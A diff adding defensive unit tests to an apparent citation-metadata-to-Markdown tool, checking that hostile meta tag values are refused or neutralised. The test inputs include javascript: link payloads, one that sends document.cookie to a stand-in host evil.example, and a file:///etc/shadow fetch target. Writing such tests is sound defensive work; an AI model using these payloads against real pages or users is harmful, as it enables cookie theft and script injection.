@@ -124,3 +124,63 @@ test("metadata without an abstract still yields a usable citation", () => {
   assert.match(out.markdown, /@article\{solo2020paper,/);
   assert.ok(out.warnings.some((w) => /abstract/i.test(w)));
 });
+
+test("a citation_pdf_url that is not http(s) is refused", () => {
+  // resolvedPdfUrl is a fetch instruction for the receiver, and the page
+  // supplies it. file:///etc/shadow is not a paper.
+  for (const bad of ["file:///etc/shadow", "javascript:fetch('//evil.example')", "chrome://settings"]) {
+    const html = `<html><head>
+      <meta name="citation_title" content="A paper">
+      <meta name="citation_author" content="Renn, Ada">
+      <meta name="citation_doi" content="10.1/abc">
+      <meta name="citation_pdf_url" content="${bad}">
+      </head><body></body></html>`;
+    const out = run("https://journal.example/a", html);
+
+    assert.equal(out.meta.resolvedPdfUrl, undefined, `${bad} must not become a fetch target`);
+    assert.doesNotMatch(out.markdown, /\*\*PDF:\*\*/, `${bad} must not be offered as a PDF either`);
+  }
+});
+
+test("an https citation_pdf_url still comes through", () => {
+  const html = `<html><head>
+    <meta name="citation_title" content="A paper">
+    <meta name="citation_author" content="Renn, Ada">
+    <meta name="citation_doi" content="10.1/abc">
+    <meta name="citation_pdf_url" content="https://journal.example/a.pdf">
+    </head><body></body></html>`;
+  const out = run("https://journal.example/a", html);
+  assert.equal(out.meta.resolvedPdfUrl, "https://journal.example/a.pdf");
+});
+
+test("markdown syntax in an author name or a title cannot forge a link", () => {
+  const html = `<html><head>
+    <meta name="citation_title" content="Ledgers](javascript:alert(1)) and logbooks">
+    <meta name="citation_author" content="Renn, Ada](javascript:fetch('//evil.example/'+document.cookie))">
+    <meta name="citation_doi" content="10.1/abc">
+    <meta name="citation_keywords" content="fog](javascript:alert(2))">
+    </head><body></body></html>`;
+  const out = run("https://journal.example/a", html);
+
+  // Inside the ```bibtex fence nothing renders, and the fence itself cannot
+  // be broken (backticks and newlines are stripped from every field), so the
+  // prose above it is what has to be clean.
+  const [prose, fenced = ""] = out.markdown.split("```bibtex");
+  assert.doesNotMatch(prose, /(?<!\\)\]\(javascript:/i);
+  assert.match(fenced, /^\n@article\{/, "and the entry is still a well-formed fenced block");
+  assert.doesNotMatch(fenced.replace(/\n```$/, ""), /```/, "which nothing in it can close early");
+});
+
+test("an arXiv id from the page cannot be anything but an arXiv id", () => {
+  // eprint is interpolated straight into https://arxiv.org/abs/<id>, so a
+  // page that declares a hostile one would be writing the link target.
+  const html = `<html><head>
+    <meta name="citation_title" content="A paper">
+    <meta name="citation_arxiv_id" content="2403.00219)](javascript:alert(1)">
+    <meta name="citation_author" content="Renn, Ada">
+    </head><body></body></html>`;
+  const out = run("https://arxiv.org/abs/2403.00219", html);
+
+  assert.doesNotMatch(out.markdown, /(?<!\\)\]\(javascript:/i);
+  assert.doesNotMatch(out.markdown, /arxiv\.org\/abs\/[^)\s]*javascript/i);
+});
